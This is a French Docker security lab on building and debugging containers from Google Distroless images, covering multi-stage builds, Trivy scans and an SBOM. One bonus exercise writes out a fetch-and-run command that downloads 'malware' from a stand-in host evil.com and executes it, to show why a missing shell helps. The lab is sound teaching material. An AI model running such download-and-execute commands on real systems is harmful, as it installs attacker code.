# TP8 - Images Distroless

## 🎯 Objectif

Apprendre à utiliser les images Distroless de Google pour créer des conteneurs ultra-sécurisés avec une surface d'attaque minimale.

## ⏱️ Durée estimée : 45 minutes

## 📋 Prérequis

- TP1 à TP7 complétés
- Compréhension du multi-stage build (TP2)

---

## 📖 Contexte Théorique

### Qu'est-ce qu'une image Distroless ?

Les images Distroless sont des images Docker qui contiennent **uniquement** :
- Le runtime de l'application (Node.js, Python, Java, etc.)
- L'application elle-même
- Les certificats CA pour HTTPS

Elles **ne contiennent PAS** :
- Shell (bash, sh)
- Gestionnaire de packages (apt, apk, yum)
- Outils système (curl, wget, ls, cat)
- Documentation, man pages

### Comparaison des surfaces d'attaque

| Image | Packages | Shell | Taille |
|-------|----------|-------|--------|
| ubuntu:22.04 | ~100+ | ✅ | ~77 MB |
| alpine:3.18 | ~15 | ✅ | ~7 MB |
| distroless | ~3 | ❌ | ~20-50 MB |
| scratch | 0 | ❌ | 0 MB |

### Images Distroless disponibles

- `gcr.io/distroless/static` - Pour binaires statiques (Go, Rust)
- `gcr.io/distroless/base` - Avec libc
- `gcr.io/distroless/cc` - Avec libstdc++
- `gcr.io/distroless/python3` - Python 3
- `gcr.io/distroless/java17-debian11` - Java 17
- `gcr.io/distroless/nodejs18-debian11` - Node.js 18

---

## 🔬 Partie Pratique

### Étape 1 : Comparer avec une image standard

```bash
# Lancer un conteneur Node.js standard
docker run --rm -it node:18-alpine sh -c "
  echo '=== Outils disponibles ==='
  which sh bash wget curl
  echo '=== Packages installés ==='
  apk list --installed 2>/dev/null | wc -l
"
```

**Observation** : De nombreux outils sont disponibles.

---

### Étape 2 : Examiner l'exemple Distroless

```bash
cd examples/distroless
cat Dockerfile
cat server.js
cat package.json
```

**Dockerfile clé** :

```dockerfile
# Étape 1: Construction avec Node.js
FROM node:18-alpine AS builder
WORKDIR /app
COPY package.json .
RUN npm install --production
COPY server.js .

# Étape 2: Image distroless pour l'exécution
FROM gcr.io/distroless/nodejs18-debian11
WORKDIR /app
COPY --from=builder /app .
USER nonroot
EXPOSE 8080
CMD ["server.js"]
```

---

### Étape 3 : Construire l'image

```bash
# Construire l'image distroless
docker build -t distroless-demo .

# Vérifier la taille
docker images distroless-demo
```

---

### Étape 4 : Lancer le conteneur

```bash
# Démarrer le conteneur
docker run -d -p 8088:8080 --name test-distroless distroless-demo

# Tester l'application
curl http://localhost:8088
```

---

### Étape 5 : Tenter d'accéder au shell

```bash
# Essayer d'ouvrir un shell
docker exec -it test-distroless /bin/sh
```

**Résultat attendu** : Erreur - le shell n'existe pas !

```bash
# Essayer avec bash
docker exec -it test-distroless /bin/bash
```

**Résultat** : Même erreur.

---

### Étape 6 : Explorer le contenu du conteneur

```bash
# Que contient le conteneur ?
# Utiliser un conteneur de debug
docker run --rm -it --pid=container:test-distroless \
  --net=container:test-distroless \
  busybox ls -la /proc/1/root/
```

Ou utiliser l'image de debug distroless :

```bash
# Image de debug (avec shell, pour debugging uniquement)
docker run --rm -it gcr.io/distroless/nodejs18-debian11:debug sh
```

---

### Étape 7 : Comparer les vulnérabilités

```bash
# Scanner l'image Node.js standard
trivy image node:18-alpine 2>/dev/null | head -50

# Scanner l'image distroless
trivy image distroless-demo 2>/dev/null | head -50
```

**Observation** : L'image distroless devrait avoir significativement moins de vulnérabilités.

---

### Étape 8 : Tester avec différents langages

#### Python Distroless

```bash
cat > /tmp/app.py << 'EOF'
print("Hello from Distroless Python!")
EOF

cat > /tmp/Dockerfile.python << 'EOF'
FROM python:3.11-slim AS builder
WORKDIR /app
COPY app.py .

FROM gcr.io/distroless/python3-debian11
WORKDIR /app
COPY --from=builder /app/app.py .
USER nonroot
CMD ["app.py"]
EOF

docker build -t python-distroless -f /tmp/Dockerfile.python /tmp
docker run --rm python-distroless
```

#### Java Distroless

```bash
cat > /tmp/Hello.java << 'EOF'
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello from Distroless Java!");
    }
}
EOF

cat > /tmp/Dockerfile.java << 'EOF'
FROM eclipse-temurin:17-jdk AS builder
WORKDIR /app
COPY Hello.java .
RUN javac Hello.java

FROM gcr.io/distroless/java17-debian11
WORKDIR /app
COPY --from=builder /app/Hello.class .
USER nonroot
CMD ["Hello"]
EOF

docker build -t java-distroless -f /tmp/Dockerfile.java /tmp
docker run --rm java-distroless
```

---

### Étape 9 : Debugging en production

Comment déboguer sans shell ?

```bash
# Option 1: Logs
docker logs test-distroless

# Option 2: Utiliser l'image debug temporairement
# Reconstruire avec :debug tag pour le debugging
docker run --rm -it gcr.io/distroless/nodejs18-debian11:debug sh

# Option 3: Utiliser un sidecar de debug
docker run -d --name debug-sidecar \
  --pid=container:test-distroless \
  --net=container:test-distroless \
  busybox sleep 3600

docker exec -it debug-sidecar sh
# Maintenant vous pouvez inspecter les processus
```

---

### Étape 10 : Nettoyage

```bash
docker stop test-distroless debug-sidecar 2>/dev/null
docker rm test-distroless debug-sidecar 2>/dev/null
docker rmi distroless-demo python-distroless java-distroless 2>/dev/null
```

---

## ✅ Points de Vérification

Avant de terminer, assurez-vous que :

- [ ] Vous comprenez ce qu'est une image Distroless
- [ ] Vous savez utiliser le multi-stage build avec Distroless
- [ ] Vous comprenez l'avantage sécurité de l'absence de shell
- [ ] Vous savez déboguer un conteneur Distroless
- [ ] Vous connaissez les différentes images Distroless disponibles

---

## 🎓 Pour Aller Plus Loin

### Exercice bonus 1 : Go avec Distroless static

```dockerfile
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY main.go .
RUN CGO_ENABLED=0 go build -o app .

FROM gcr.io/distroless/static
COPY --from=builder /app/app /app
USER nonroot
ENTRYPOINT ["/app"]
```

### Exercice bonus 2 : Chameleon Attack Simulation

Démontrez pourquoi l'absence de shell est importante :

```bash
# Avec shell (vulnérable)
docker run --rm alpine sh -c "wget http://evil.com/malware && ./malware"

# Sans shell (protégé)
docker run --rm gcr.io/distroless/static sh -c "wget http://evil.com/malware"
# Erreur: pas de shell pour exécuter cette commande
```

### Exercice bonus 3 : SBOM (Software Bill of Materials)

```bash
# Générer un SBOM pour l'image distroless
trivy image --format spdx-json distroless-demo > sbom.json
```

---

## 📚 Ressources

- [Distroless GitHub](https://github.com/GoogleContainerTools/distroless)
- [Google Distroless Blog](https://cloud.google.com/blog/products/identity-security/distroless-container-images-security)
- [Choosing a base image](https://cloud.google.com/architecture/best-practices-for-building-containers#choosing_a_base_image)

---

⬅️ **Précédent** : [TP7 - Filesystem Read-Only](./TP7-readonly-filesystem.md)

---

## 🎉 Félicitations !

Vous avez terminé tous les TPs de sécurité Docker par design !

### Récapitulatif des compétences acquises

1. ✅ Exécuter des conteneurs avec utilisateur non-root
2. ✅ Créer des images minimales avec multi-stage build
3. ✅ Isoler les services avec des réseaux séparés
4. ✅ Gérer les secrets de manière sécurisée
5. ✅ Protéger contre les attaques DoS avec des limites
6. ✅ Scanner les images pour les vulnérabilités
7. ✅ Utiliser un filesystem read-only
8. ✅ Déployer avec des images Distroless

### Prochaines étapes recommandées

- Appliquer ces concepts à vos propres projets
- Explorer Kubernetes et les Pod Security Policies
- Étudier les outils de runtime security (Falco, Sysdig)
- Implémenter un pipeline CI/CD avec scanning automatique

Bonne continuation dans votre parcours de sécurité conteneurs ! 🐳🔒
